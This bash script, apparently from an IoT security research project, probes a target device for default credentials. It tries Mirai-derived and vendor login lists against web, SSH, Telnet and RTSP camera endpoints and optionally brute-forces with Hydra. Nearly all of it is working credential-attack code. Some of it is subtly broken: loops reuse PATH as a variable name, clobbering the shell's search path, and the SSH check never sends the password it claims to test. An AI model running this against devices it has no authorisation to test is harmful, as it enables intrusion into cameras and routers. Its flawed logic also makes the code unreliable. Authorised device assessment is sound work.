#!/usr/bin/env bash
# =============================================================================
# credential_test.sh — Default Credential & Brute-Force Testing
# IoT Security Research | Phase 2: Credential Attack
# =============================================================================
# Checks for default credentials first, then optionally runs Hydra.
# Tests web interfaces (HTTP/HTTPS), SSH, Telnet, and RTSP endpoints.
#
# Usage:
#   sudo bash credential_test.sh --target 192.168.100.X --label cam-s1 \
#                                --out experiments/ip-camera/logs/ [--brute]
#
# Requires: curl, nmap, hydra (optional for brute force)
# =============================================================================

set -euo pipefail

# ── Defaults ──────────────────────────────────────────────────────────────────
TARGET=""
LABEL="device"
OUT_DIR="./output"
BRUTE_FORCE=false
HTTP_PORT=80
HTTPS_PORT=443
SSH_PORT=22
TELNET_PORT=23
RTSP_PORT=554

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target)    TARGET="$2";     shift 2 ;;
    --label)     LABEL="$2";      shift 2 ;;
    --out)       OUT_DIR="$2";    shift 2 ;;
    --http-port) HTTP_PORT="$2";  shift 2 ;;
    --brute)     BRUTE_FORCE=true; shift ;;
    *) echo "[ERROR] Unknown argument: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[ERROR] --target is required"; exit 1; }

mkdir -p "$OUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUT_DIR/creds_${LABEL}_${TIMESTAMP}.log"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }
success() { echo "[$(date +%H:%M:%S)] ✓ SUCCESS: $*" | tee -a "$LOG_FILE"; }
fail()    { echo "[$(date +%H:%M:%S)] ✗ FAILED : $*" | tee -a "$LOG_FILE"; }

# ── Default credential pairs (IoT-specific) ───────────────────────────────────
# Sources: Mirai source code, Shodan, vendor defaults, CVE database
DEFAULT_CREDS=(
  "admin:admin"
  "admin:password"
  "admin:1234"
  "admin:12345"
  "admin:123456"
  "admin:admin123"
  "admin:"
  "root:root"
  "root:admin"
  "root:password"
  "root:toor"
  "root:"
  "user:user"
  "user:password"
  "guest:guest"
  "guest:"
  # TP-Link specific
  "admin:tp-link"
  "admin:tplink"
  # Camera defaults
  "admin:ipcam"
  "admin:camera"
  # Mirai top credentials
  "support:support"
  "service:service"
  "supervisor:supervisor"
  "ubnt:ubnt"
  "xc3511:"
  "vizxv:"
  "admin:smcadmin"
)

log "===== Credential Attack Test ====="
log "Target    : $TARGET"
log "Label     : $LABEL"
log "Brute force: $BRUTE_FORCE"
log ""

# ── Step 1: Discover open services ────────────────────────────────────────────
log "── Step 1: Quick Service Discovery ──"
OPEN_PORTS=$(nmap -p 22,23,80,443,554,8080,8443,8888,9000 --open -T4 "$TARGET" 2>/dev/null \
  | grep "open" | awk '{print $1}' | tr '\n' ' ')
log "Open ports: ${OPEN_PORTS:-none detected}"

# ── Step 2: HTTP/HTTPS default credential test ────────────────────────────────
log ""
log "── Step 2: HTTP/HTTPS Default Credential Test ──"

test_http_creds() {
  local SCHEME=$1
  local PORT=$2
  local BASE_URL="${SCHEME}://${TARGET}:${PORT}"

  # Common IoT admin paths
  local PATHS=("/" "/index.html" "/admin" "/cgi-bin/login.cgi" "/cgi-bin/admin.cgi"
                "/api/v1/login" "/web" "/login" "/setup")

  log "Testing $BASE_URL ..."

  for CRED in "${DEFAULT_CREDS[@]}"; do
    USER="${CRED%%:*}"
    PASS="${CRED##*:}"

    # Try Basic Auth
    HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      --connect-timeout 3 \
      -u "${USER}:${PASS}" \
      "${BASE_URL}/" 2>/dev/null || echo "000")

    if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "302" ]]; then
      success "Basic Auth — $SCHEME:$PORT — user='$USER' pass='$PASS' (HTTP $HTTP_CODE)"
      echo "CREDENTIAL_FOUND: basic_auth $SCHEME $PORT $USER $PASS" >> "$LOG_FILE"
    fi

    # Try form-based login (common IoT pattern)
    for PATH in "${PATHS[@]}"; do
      HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
        --connect-timeout 3 \
        -X POST \
        -d "username=${USER}&password=${PASS}&submit=Login" \
        "${BASE_URL}${PATH}" 2>/dev/null || echo "000")

      if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "302" ]]; then
        # Heuristic: check for redirect away from login page or session cookie
        RESP=$(curl -sk -c /tmp/cookie_jar_$$ \
          -d "username=${USER}&password=${PASS}" \
          "${BASE_URL}${PATH}" 2>/dev/null || echo "")
        if echo "$RESP" | grep -qi "logout\|dashboard\|welcome\|signed in"; then
          success "Form login — $SCHEME:$PORT$PATH — user='$USER' pass='$PASS'"
          echo "CREDENTIAL_FOUND: form_login $SCHEME $PORT $PATH $USER $PASS" >> "$LOG_FILE"
          rm -f /tmp/cookie_jar_$$ 2>/dev/null
        fi
      fi
    done
  done
  rm -f /tmp/cookie_jar_$$ 2>/dev/null
}

# Test HTTP
if echo "$OPEN_PORTS" | grep -q "80\|8080"; then
  test_http_creds "http" "$HTTP_PORT"
fi

# Test HTTPS (skip cert validation — that's a separate test)
if echo "$OPEN_PORTS" | grep -q "443\|8443"; then
  test_http_creds "https" "$HTTPS_PORT"
fi

# ── Step 3: SSH default credential test ───────────────────────────────────────
if echo "$OPEN_PORTS" | grep -q "22"; then
  log ""
  log "── Step 3: SSH Default Credential Test ──"

  SSH_CREDS=("admin:admin" "root:root" "root:" "admin:" "ubnt:ubnt" "pi:raspberry")

  for CRED in "${SSH_CREDS[@]}"; do
    USER="${CRED%%:*}"
    PASS="${CRED##*:}"

    if ssh -o ConnectTimeout=3 \
           -o StrictHostKeyChecking=no \
           -o PasswordAuthentication=yes \
           -o BatchMode=no \
           -o PubkeyAuthentication=no \
           "${USER}@${TARGET}" "echo OK" &>/dev/null; then
      success "SSH — user='$USER' pass='$PASS'"
      echo "CREDENTIAL_FOUND: ssh $USER $PASS" >> "$LOG_FILE"
    fi
  done
  log "SSH default credential test complete."
fi

# ── Step 4: Telnet test (legacy IoT protocol) ─────────────────────────────────
if echo "$OPEN_PORTS" | grep -q "23"; then
  log ""
  log "── Step 4: Telnet Default Credential Test ──"
  log "⚠  Telnet found open — this is a CRITICAL finding (plaintext protocol)"
  echo "CRITICAL_FINDING: telnet_open $TARGET:23" >> "$LOG_FILE"

  # Use Hydra for Telnet credential stuffing
  if command -v hydra &>/dev/null; then
    printf '%s\n' "${DEFAULT_CREDS[@]}" | sed 's|:|/|' > /tmp/telnet_creds_$$
    hydra -C /tmp/telnet_creds_$$ -t 4 -T 3 telnet://"$TARGET":23 \
      2>/dev/null | tee -a "$LOG_FILE" || true
    rm -f /tmp/telnet_creds_$$
  fi
fi

# ── Step 5: RTSP stream access (IP cameras) ───────────────────────────────────
if echo "$OPEN_PORTS" | grep -q "554"; then
  log ""
  log "── Step 5: RTSP Stream Access Test ──"

  RTSP_PATHS=(
    "/"
    "/stream"
    "/stream1"
    "/live"
    "/h264"
    "/video.mp4"
    "/cam/realmonitor"
    "/user=admin&password=&channel=1&stream=0.sdp"
    "/onvif1"
  )

  for CRED in "admin:admin" "admin:" "admin:1234" "admin:password" ":"; do
    USER="${CRED%%:*}"
    PASS="${CRED##*:}"
    for PATH in "${RTSP_PATHS[@]}"; do
      RTSP_URL="rtsp://${USER}:${PASS}@${TARGET}:554${PATH}"
      # Use curl to test RTSP OPTIONS method
      HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
        --connect-timeout 3 \
        -X OPTIONS \
        "$RTSP_URL" 2>/dev/null || echo "000")
      if [[ "$HTTP_CODE" == "200" ]]; then
        success "RTSP stream accessible — $RTSP_URL"
        echo "CREDENTIAL_FOUND: rtsp $TARGET $USER $PASS $PATH" >> "$LOG_FILE"
      fi
    done
  done
fi

# ── Step 6: Optional Hydra brute force ────────────────────────────────────────
if [[ "$BRUTE_FORCE" == "true" ]]; then
  log ""
  log "── Step 6: Hydra Brute Force (rate-limited) ──"

  if ! command -v hydra &>/dev/null; then
    log "Hydra not found. Skipping brute force. Install: apt install hydra"
  else
    # Use a small, IoT-targeted wordlist (not rockyou — too large)
    WORDLIST="/usr/share/wordlists/metasploit/http_default_pass.txt"
    USERLIST="/usr/share/wordlists/metasploit/http_default_users.txt"

    if [[ -f "$WORDLIST" && -f "$USERLIST" ]]; then
      HYDRA_OUT="$OUT_DIR/hydra_${LABEL}_${TIMESTAMP}.txt"
      hydra -L "$USERLIST" -P "$WORDLIST" \
        -t 4 -w 3 \
        -o "$HYDRA_OUT" \
        http-post-form://"$TARGET":$HTTP_PORT"/admin:username=^USER^&password=^PASS^:F=incorrect" \
        2>&1 | tail -5 | tee -a "$LOG_FILE"
      log "Hydra results: $HYDRA_OUT"
    else
      log "Wordlists not found at $WORDLIST — skipping Hydra."
    fi
  fi
fi

# ── Summary ───────────────────────────────────────────────────────────────────
log ""
log "===== Credential Test Complete ====="

FOUND=$(grep -c "CREDENTIAL_FOUND" "$LOG_FILE" || echo 0)
CRITICAL=$(grep -c "CRITICAL_FINDING" "$LOG_FILE" || echo 0)

log "Default credentials found : $FOUND"
log "Critical findings         : $CRITICAL"
log ""

if [[ "$FOUND" -gt 0 || "$CRITICAL" -gt 0 ]]; then
  log "⚠  RESULT: VULNERABLE — device accepts default credentials"
  log "   OWASP: I1 (Weak Passwords), I9 (Insecure Default Settings)"
  log "   ETSI:  Provision 5.1 violation"
  log "   NIST:  SP 800-213 — device should be considered UNSECURABLE in State 1"
else
  log "✓  No default credentials accepted."
  log "   Check if device prompted for password change on first setup."
fi

log "Full log: $LOG_FILE"
